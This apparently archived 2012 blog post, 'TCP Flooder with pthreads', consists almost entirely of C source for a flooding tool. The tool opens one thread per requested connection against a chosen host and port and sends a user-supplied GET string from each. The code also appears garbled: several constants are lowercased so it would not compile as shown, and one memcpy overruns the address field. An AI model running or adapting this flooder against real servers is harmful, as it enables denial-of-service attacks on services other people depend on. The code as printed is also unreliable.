---
layout: post
title: TCP Flooder with pthreads
date: '2012-01-05T18:34:00.000-08:00'
author: Daniel Hilst
tags:
- TCP
- flooder
- c
- socket
- pthread
modified_time: '2012-01-25T15:10:37.655-08:00'
thumbnail: http://4.bp.blogspot.com/-jfxysckK2MM/TwZf-EBHc2I/AAAAAAAAAL8/bicQoQak3nI/s72-c/a.png
blogger_id: tag:blogger.com,1999:blog-8785437776394405849.post-1581105792386848664
blogger_orig_url: http://gkos-hw.blogspot.com/2012/01/tcp-flooder-with-pthreads.html
---

<div class="separator" style="clear: both; text-align: center;"></div><pre class="brush: c">/**<br /> * This code creates N threads. Each threads does one GET to an address. The<br /> * GET, the address and the number of threads are passed as argument. An "\r\n"<br /> * is appended to the GET string. <br /> */<br />/* headers *//*{{ "{{" }}{*/<br />#include &lt;errno.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;sys/socket.h&gt;<br />#include &lt;sys/types.h&gt;<br />#include &lt;pthread.h&gt;<br />#include &lt;netinet/in.h&gt;<br />#include &lt;netinet/ip.h&gt;<br />#include &lt;netdb.h&gt;/*}}}*/<br /><br />/* declarations and prototypes */ /*{{ "{{" }}{*/<br />#define pexit(s) ({perror(s); exit(exit_failure);})<br />static struct cstats { <br />        int socket_errors;<br />        int send_errors;<br />        int recv_errors;<br />        int connect_errors;<br />        int avg_respt; /* average response time */<br />        pthread_mutex_t mutex;<br />} cstats;<br />        <br /><br />struct sockaddr_in addr;<br /><br />#define buflen 1024<br />static char buf[buflen];<br />static int buf_len;<br /><br />void *get_get_thread(void *);/*}}}*/<br /><br />int main(int argc, char **argv)<br />{<br />        /* main declarations *//*{{ "{{" }}{*/<br />        int i;<br />        int fail = 0;<br />        int ngets;<br /> int addr_len;<br /> int error;<br /> struct hostent *host;<br />        pthread_t *threadv;<br />        pthread_attr_t attr;/*}}}*/<br />  <br />        /* error checking *//*{{ "{{" }}{*/<br /> if (argc &lt;= 4) { <br />  printf("usage: %s address port number_of_gets get_string\n", argv[0]);<br />  exit(exit_failure);<br /> }<br /><br /><br />        ngets = atoi(argv[3]);<br />        if (ngets &lt;= 0) {<br />                printf("number_of_gets\n");<br />                errno = einval;<br />                exit(exit_failure);<br />        }<br />/*}}}*/<br /><br />        bzero(&amp;cstats, sizeof(struct cstats));<br /><br />        /* pthread initialization *//*{{ "{{" }}{*/<br />        pthread_attr_init(&amp;attr);<br />        pthread_attr_setdetachstate(&amp;attr, pthread_create_joinable);<br />        pthread_mutex_init(&amp;cstats.mutex, null);<br />        threadv = malloc(sizeof(pthread_t) * ngets);<br />        if (!threadv) <br />                pexit("malloc");/*}}}*/<br /><br />        /* address initialization *//*{{ "{{" }}{*/<br />        strncpy(buf, argv[4], buflen);<br />        strncat(buf, "\r\n", buflen);<br /><br /> host = gethostbyname(argv[1]);<br /> if (!host)<br />  pexit("gethostbyname");<br /><br /> memcpy(&amp;addr.sin_addr.s_addr, host-&gt;h_addr_list[0], sizeof(struct<br />    sockaddr_in)); <br /> addr.sin_family = pf_inet;<br /> addr.sin_port = htons(atoi(argv[2]));<br />/*}}}*/<br /><br />        /* creating threads *//*{{ "{{" }}{*/<br /> for (i = 0; i &lt; ngets; i++) {<br />                error = pthread_create(&amp;threadv[i], &amp;attr,<br />                                        get_get_thread, null);<br />                if (error)<br />                        fail++; <br /> }/*}}}*/<br /><br /><br />        printf("%d thread created. Running...\n", ngets -  fail);<br /><br />        /* joing threads *//*{{ "{{" }}{*/<br />        for (i = 0; i &lt; ngets; i++) {<br />                error = pthread_join(threadv[i], null);<br />                if (error)<br />                        perror("pthread_join");<br />        }/*}}}*/<br /><br />        /* output *//*{{ "{{" }}{*/<br />        printf("errors:\n"<br />               "    socket() errors: %d\n"<br />               "    connect() errors: %d\n"<br />               "    send() errors: %d\n"<br />               "    recv() errors: %d\n", cstats.socket_errors,<br />               cstats.connect_errors, cstats.send_errors, cstats.recv_errors);/*}}}*/<br /><br /> return 0;<br />}<br /><br />void *get_get_thread(void *dummy)/*{{ "{{" }}{*/<br />{<br />        int error;<br />        int nbytes;<br />        int sock;<br />#define RBUF_LEN 1024<br />        char rbuf[RBUF_LEN];<br /><br /> sock = socket(PF_INET, SOCK_STREAM, 0);/*{{ "{{" }}{*/<br /> if (sock &lt; 0) {<br />                pthread_mutex_lock(&amp;cstats.mutex);<br />                cstats.socket_errors++;<br />                pthread_mutex_unlock(&amp;cstats.mutex);<br />        }/*}}}*/<br /><br /> error = connect(sock, (struct sockaddr *)&amp;addr, sizeof addr);/*{{ "{{" }}{*/<br /> if (error) {<br />                pthread_mutex_lock(&amp;cstats.mutex);<br />                cstats.connect_errors++;<br />                pthread_mutex_unlock(&amp;cstats.mutex);<br />        }/*}}}*/<br /><br />        nbytes = send(sock, buf, strlen(buf) , 0);/*{{ "{{" }}{*/<br />        if (nbytes == -1) /* error */ {<br />                pthread_mutex_lock(&amp;cstats.mutex);<br />                cstats.send_errors++;<br />                pthread_mutex_unlock(&amp;cstats.mutex);<br />        }/*}}}*/<br /><br />        nbytes = recv(sock, rbuf, RBUF_LEN, 0);/*{{ "{{" }}{*/<br />        if (nbytes == -1) {<br />                pthread_mutex_lock(&amp;cstats.mutex);<br />                cstats.recv_errors++;<br />                pthread_mutex_unlock(&amp;cstats.mutex);<br />        }/*}}}*/<br /><br /> close(sock);<br />        return (void *)0;<br />}/*}}}*/<br /><br />/* vim: set fdm=marker: tw=80 : */<br /><br /></pre><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-jfxysckK2MM/TwZf-EBHc2I/AAAAAAAAAL8/bicQoQak3nI/s1600/a.png" imageanchor="1" style="clear: left; float: left; margin-bottom: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-jfxysckK2MM/TwZf-EBHc2I/AAAAAAAAAL8/bicQoQak3nI/s1600/a.png" /></a></div>